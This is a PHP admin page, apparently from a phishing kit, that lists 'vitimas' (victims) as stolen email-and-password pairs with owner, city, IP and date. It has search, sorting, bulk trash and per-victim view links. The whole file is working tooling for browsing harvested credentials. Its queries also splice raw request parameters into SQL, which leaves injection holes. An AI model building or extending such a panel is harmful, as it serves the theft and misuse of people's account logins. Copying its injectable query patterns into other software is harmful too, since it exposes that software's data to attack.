<style type="text/css">
	.avancada form{margin: 15px 0px;}
	.avancada form input[type="number"]{
		width: 60px;
	}
	.lista{margin-bottom: 20px;}
	.lista li{color:#444;}
	.lista li:hover{background:#ddd;color:blue;}
	.lista .icons{
		margin: 0px 5px;float: right;
		cursor: pointer;font-weight: bold;
	}
	.lista .icons:hover{
		color: red;
	}
</style>
<?php
if (isset($_GET['ordem']) && !empty($_GET['ordem'])) {
	if ($_GET['ordem'] == "novos" || $_GET['ordem'] == "antigos") {
		$ordem = $_GET['ordem'];
	}
	else{ 
		$ordem = "novos";
	}
}else{
	$ordem = "novos";
}
switch ($ordem) {
	case 'novos':
	$ordem = "DESC";
	break;
	case 'antigos':
		$ordem = "ASC";
	break;
}
// deletar
if (isset($_GET['dell'])) {
	$priv = anti_injection($_GET['dell']);
	//$query = "DELETE FROM vitimas WHERE id = ".$priv."  ";
	$query = "UPDATE vitimas SET privacidade = 'lixo' WHERE id = ".$priv."  ";
	executa_query($query);
}
// dell em massa
if (isset($_GET['dells']) && !empty($_GET['dells'])) {
	$a = $_GET['dells'];
	$b = "id = '".$a."'";
	$where = str_replace(",","' OR id = '",$b);
	$query = "UPDATE vitimas SET privacidade = 'lixo' WHERE (".$where.")  ";
	
	if (executa_query($query) === TRUE) {
		echo "<div style='color:green;'>Sucesso => ".$where."</div>";
	}else {echo "<div style='color:red;'>Erro => ".$where."</div>";}

}
?>
<h1>Vitimas</h1>
<?php 
if (!isset($_GET['pesquise'])) { ?>
<div>
	<form>
		<input type="hidden" value="vitimas.php" name="p">
		<input type="hidden" value="1" name="pesquise">
		<label for="pesquise">Pesquise:</label>
		<input type="text" name="PorTodos" id="pesquise">
		<select onchange="searchPor();" id="bpor">
			<option value="0" selected>Todos</option>
			<option value="1">Email</option>
			<option value="2">Senha</option>
			<option value="3">Dono</option>
			<option value="4">Cidade</option>
			<option value="5">Ip</option>
			<option value="6">Data</option>
			<option value="7">ID</option>
		</select>
		<select name="ordem">
				<option value="novos">Novos</option>
				<option value="antigos">Antigos</option>
			</select>
		<input title="Deixe em 0 para ilimitado" type="number" value="0" name="limit" min="0" maxlength="1" required style="width: 35px;text-align: center;">
		<button>Buscar</button>
	</form><hr>
	<div class="avancada">
		<form>
			<input type="hidden" value="vitimas.php" name="p">
			<input type="hidden" value="4" name="pesquise">
			<label for="pesquise">Exibir tudo</label>
			<select name="ordem">
				<option value="novos">Novos</option>
				<option value="antigos">Antigos</option>
			</select>
			<button>></button>
		</form>
	</div>
	<h1> <?php $query = "SELECT * FROM vitimas WHERE privacidade <> 'lixo' ";if (executa_query($query)) {$total = mysqli_num_rows(executa_query($query));echo $total;}else{echo "0";} ?>
	 Vitimas</h1>
</div>

<?php }else{ ?>
<a href="?p=vitimas.php" title="Voltar ao menu" style="display: block;">Voltar <</a>

<form method="get" action="./" id="delllxk23" style="display:none;margin: 10 auto;">
	<input type="hidden" name="p" value="vitimas.php">
	<input type="hidden" name="pesquise" value="<?php echo @$_GET['pesquise']; ?>">
	<input type="hidden" name="ordem" value="<?php echo @$_GET['ordem']; ?>">
	<input type="hidden" id="demo"  style="width: 400px;" name="dells">
	<button style="display: block;margin: 10px 15px;">Deletar</button>
</form>
<div class="lista" style="margin-top: 10px;">
  	<?php 
  	if (isset($_GET['b'])) {
  		echo "<h2><a href='./?p=lixeira.php' title='Sair da busca' > Voltar </a></h2>";
  	} ?>
  <ul>
  	<?php
  	
  	if (isset($_GET['PorTodos'])) {
  		$key = $_GET['PorTodos'];
  		$buscaSql = " AND (id LIKE '%". $key ."%' OR email LIKE '%". $key ."%' OR senha LIKE '%". $key ."%' OR data LIKE '%". $key ."%' OR local LIKE '%". $key ."%' OR ip LIKE '%". $key ."%' OR dono LIKE '%". $key ."%') ";
  	}
  	if (isset($_GET['PorEmail'])) {
  		$key = $_GET['PorEmail'];
  		$buscaSql = " AND (email LIKE '%". $key ."%') ";
  	}
  	if (isset($_GET['PorSenha'])) {
  		$key = $_GET['PorSenha'];
  		$buscaSql = " AND (senha LIKE '%". $key ."%') ";
  	}
  	if (isset($_GET['PorDono'])) {
  		$key = $_GET['PorDono'];
  		$buscaSql = " AND (dono LIKE '%". $key ."%') ";
  	}
  	if (isset($_GET['PorCidade'])) {
  		$key = $_GET['PorCidade'];
  		$buscaSql = " AND (local LIKE '%". $key ."%') ";
  	}
  	if (isset($_GET['PorIp'])) {
  		$key = $_GET['PorIp'];
  		$buscaSql = " AND (ip LIKE '%". $key ."%') ";
  	}
  	if (isset($_GET['PorData'])) {
  		$key = $_GET['PorData'];
  		$buscaSql = " AND (data LIKE '%". $key ."%') ";
  	}
  	if (isset($_GET['PorDono'])) {
  		$key = $_GET['PorDono'];
  		$buscaSql = " AND (dono LIKE '%". $key ."%') ";
  	}
  	if (isset($_GET['PorId'])) {
  		$key = $_GET['PorId'];
  		$buscaSql = " AND (id LIKE '%". $key ."%') ";
  	}
  	if (isset($_GET['limit'])) {
  		$limit = $_GET['limit'];
  		if ($limit < 1) {
  			$limit = " ";
  		}else{ $limit = "LIMIT ".$_GET['limit']; }
  	}
	$ler = @ler_db("vitimas", "WHERE privacidade <> 'lixo' ".@$buscaSql." ORDER BY id ".$ordem." ".$limit." ");
	if (!empty($ler)) {
		foreach ($ler as $lers) {
		?>
		<li>
			<input type="checkbox" onclick="dell_check('<?php echo $lers['id']; ?>');" id="Vcheck_<?php echo $lers['id']; ?>"   >
	    	<span>[<?php echo $lers['id']; ?>]</span> 
	    	<span>[<?php echo $lers['email']." ==> ";echo $lers['senha']  ?> ]</span> 
	    	<span> DONO:<?php echo $lers['dono']; ?></span> 
	    	<span class="icons" onclick="this.parentElement.style.display='none'" title="Ocultar temporariamente">-</span>
	    	<span class="icons" onclick="window.location.href='./?p=vitimas.php&dell=<?php echo $lers['id']; ?>';" title="Mover para lixeira">X</span>
	    	<span class="icons" onclick="window.open('/vitimas/?id=<?php echo ($lers['id'] * 77); ?>&root=root', '_blank');" title="Visualizar">+</span>
	    </li>
    	<?php 
		}
	}else{
	echo "Vazio";
	}
	?>
  </ul>
</div>


<?php } ?>
<script type="text/javascript">
function dell_check(id){
	document.getElementById("delllxk23").style.display = "block";
	var demo = document.getElementById('demo');
	if (document.getElementById('Vcheck_' + id ).checked == true) {
		if (demo.value == "") { 
			demo.value = id;
		}else{
			demo.value = demo.value + ","+ id;
		}
	}else{
		if(demo.value.match(id+',')){
		  remove = demo.value.replace(id+',', '');
		}else{
			remove = demo.value.replace(id, '');
		}

		demo.value = remove;
	}
	if (demo.value == "") { 
		document.getElementById("delllxk23").style.display = "none";
	}
}
	function searchPor(){
		var input = document.getElementById("pesquise");
		if(document.getElementById('bpor').value =="0"){
			input.name = "PorTodos";
		}if(document.getElementById('bpor').value =="1"){
			input.name = "PorEmail";
		}
		if(document.getElementById('bpor').value =="2"){
			input.name = "PorSenha";
		}
		if(document.getElementById('bpor').value =="3"){
			input.name = "PorDono";
		}
		if(document.getElementById('bpor').value =="4"){
			input.name = "PorCidade";
		}
		if(document.getElementById('bpor').value =="5"){
			input.name = "PorIp";
		}
		if(document.getElementById('bpor').value =="6"){
			input.name = "PorData";
		}
		if(document.getElementById('bpor').value =="7"){
			input.name = "PorId";
		}
	}
</script>